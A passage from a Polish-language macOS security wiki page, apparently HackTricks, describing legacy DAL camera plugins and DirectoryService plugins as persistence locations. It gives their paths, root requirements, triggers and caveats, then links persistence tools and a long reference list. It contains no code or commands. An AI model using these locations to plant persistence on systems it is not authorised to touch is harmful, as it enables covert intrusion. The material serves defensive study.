Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalny przykład: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Mechanizm starszego typu:** Przestarzały od macOS 12.3. macOS 14.1 i nowsze domyślnie wyłączają starsze wtyczki wideo. Aby ta ścieżka zadziałała, użytkownik musi przywrócić obsługę starszych wtyczek w trybie Recovery; sam katalog z prawem zapisu nie wystarczy. [Aktualne wskazówki Apple dotyczące pomocy](https://support.apple.com/en-us/108387).
- Do zapisu w katalogu wtyczek wymagane są uprawnienia root. Wykonanie kodu zależy od zgodnego klienta, który nadal ładuje wtyczki DAL; nie testowano tego w czasie działania na macOS 26.

#### Lokalizacja

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Wymagane uprawnienia root
  - **Wyzwalacz:** Zgodny klient kamery wylicza urządzenia **po przywróceniu obsługi starszych wtyczek**. Walidacja bibliotek przez klienta może zablokować wtyczkę innej firmy.

#### Opis i wykorzystanie

Wtyczki **DAL** (Device Abstraction Layer) CoreMediaIO były ładowane w procesie przez niektóre aplikacje do obsługi kamer. W prezentacji Apple dotyczącej [rozszerzeń kamery](https://developer.apple.com/videos/play/wwdc2022/10022/) wyraźnie zaznaczono, że starsze wtyczki DAL **nie** działały z FaceTime, QuickTime Player ani Photo Booth, a wiele innych klientów wymaga walidacji bibliotek. Współczesne [rozszerzenia Core Media I/O](https://developer.apple.com/documentation/coremediaio) działają poza procesem, z odrębnym modelem instalacji i zatwierdzania. Historyczna technika wykorzystująca działanie w procesie nie oznacza ogólnego obejścia Camera TCC we współczesnym macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Obserwacja tylko do odczytu w macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` istnieje i należy do użytkownika root. Nie zweryfikowano ani obsługi starszych wtyczek, ani ładowania ich przez jakiegokolwiek klienta.

### Wtyczki Directory Service

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Starszy mechanizm warunkowy:** Instalacja wymaga uprawnień root, a wtyczka musi być faktycznie skonfigurowana i załadowana. API wtyczek DirectoryService jest przestarzałe; przed uznaniem tego za mechanizm wyzwalany przy rozruchu sprawdź konfigurację Open Directory na docelowym Macu.

#### Lokalizacja

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Wymagane uprawnienia root
  - **Wyzwalacz:** `dspluginhelperd` ładuje odpowiednią skonfigurowaną wtyczkę, gdy jest ona potrzebna Open Directory. [Przewodnik Apple dotyczący środowiska uruchomieniowego wtyczek](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) informuje, że wtyczki nieskonfigurowane do uruchamiania przy starcie mogą być ładowane na żądanie po otwarciu ich węzła.

#### Opis i wykorzystanie

`dspluginhelperd` obsługuje starsze pakiety wtyczek DirectoryService. Złośliwa wtyczka może stanowić ścieżkę do wykonania kodu z podwyższonymi uprawnieniami, jeśli starsza wtyczka zostanie zaakceptowana i aktywowana; jest to odrębne od PAM i Authorization Plugins. Sama obecność katalogu nie dowodzi, że nowo zapisana wtyczka uruchomi się przy następnym rozruchu. Lokalne podręczniki Apple `dspluginhelperd(8)` i `opendirectoryd(8)` w macOS 26.5 nadal wymieniają ten proces pomocniczy i starszą ścieżkę.<sup>[[53]](#references)</sup>

Obserwacja tylko do odczytu w macOS 26: `/Library/DirectoryServices/PlugIns` i `/usr/libexec/dspluginhelperd` istnieją. Podczas tego testu nie instalowano, nie konfigurowano ani nie ładowano żadnej wtyczki.

## Techniki i narzędzia utrzymywania dostępu

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025 — rok Infostealerów](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Poza dobrymi, starymi LaunchAgents — 1 — pliki startowe powłoki](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Poza dobrymi, starymi LaunchAgents — 18 — X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Poza dobrymi, starymi LaunchAgents — 21 — ponownie otwierane aplikacje](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Poza dobrymi, starymi LaunchAgents — 20 — preferencje Terminala](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Poza dobrymi, starymi LaunchAgents — 13 — wtyczki audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Wtyczki Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Poza dobrymi, starymi LaunchAgents — 12 — wtyczki QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Poza dobrymi, starymi LaunchAgents — 22 — LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Poza dobrymi, starymi LaunchAgents — 4 — zadania cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Poza dobrymi, starymi LaunchAgents — 2 — uruchamianie iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Poza dobrymi, starymi LaunchAgents — 7 — wtyczki xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Poza dobrymi, starymi LaunchAgents — 8 — Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Poza dobrymi, starymi LaunchAgents — 6 — SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Poza dobrymi, starymi LaunchAgents — 3 — elementy logowania](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Poza dobrymi, starymi LaunchAgents — 14 — atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Poza dobrymi, starymi LaunchAgents — 24 — akcje folderów](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Akcje folderów jako mechanizm utrzymywania dostępu w macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Poza dobrymi, starymi LaunchAgents — 27 — skróty Docka](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Poza dobrymi, starymi LaunchAgents — 17 — próbniki kolorów](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Poza dobrymi, starymi LaunchAgents — 26 — wtyczki Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza mechanizmu utrzymywania dostępu „Mac File Opener” (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Poza dobrymi, starymi LaunchAgents — 16 — wygaszacz ekranu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zachowanie dostępu: wygaszacze ekranu jako mechanizm utrzymywania dostępu w macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Poza dobrymi, starymi LaunchAgents — 11 — importery Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Poza dobrymi, starymi LaunchAgents — 9 — panel preferencji](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Poza dobrymi, starymi LaunchAgents — 19 — skrypty okresowe](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Poza dobrymi, starymi LaunchAgents — 5 — Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Poza dobrymi, starymi LaunchAgents — 28 — Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Trwała kradzież danych uwierzytelniających za pomocą Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Poza dobrymi, starymi LaunchAgents — 30 — plik konfiguracyjny man — man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Poza dobrymi, starymi LaunchAgents — 25 — moduły Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Poza dobrymi, starymi LaunchAgents — 31 — struktura audytu BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Poza dobrymi, starymi LaunchAgents — 23 — emond, demon monitorujący zdarzenia](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Poza dobrymi, starymi LaunchAgents — 29 — amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Poza dobrymi, starymi LaunchAgents — 15 — xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Poza dobrymi, starymi LaunchAgents — 10 — pliki skryptów aplikacji](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Poza dobrymi, starymi LaunchAgents — 32 — wtyczki kafelków Docka](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Poza dobrymi, starymi LaunchAgents — 33 — widżety](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Poza dobrymi, starymi LaunchAgents — 34 — zadania rozruchowe launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Poza dobrymi, starymi LaunchAgents — 35 — utrzymywanie dostępu przez NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Wykorzystanie poczty e-mail do utrzymywania dostępu w OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Podejrzana modyfikacja pliku plist reguł Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Złośliwe profile — jedno z największych zagrożeń dla Maców (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Sztuka złośliwego oprogramowania na Maca, tom 1 — rozdz. 0x2: utrzymywanie dostępu (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analiza CVE-2024-44243 — obejście SIP w macOS za pomocą rozszerzeń jądra (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE i eksfiltracja tokena API przez pliki projektu Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nowa luka w GitHub Copilot i Cursor — backdoor w pliku reguł (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome — alternatywne metody instalacji (rozszerzenia zewnętrzne)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Usuwanie ExtensionInstallForcelist w Chrome na Macu (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [O tworzeniu wtyczek Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Zdalne wykorzystanie Maca za pomocą niestandardowych schematów URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dwie sztuczki utrzymywania dostępu w macOS wykorzystujące wtyczki (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimalny przykład CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analiza luki macOS TCC opartej na Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentacja modułu `site` w Pythonie (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
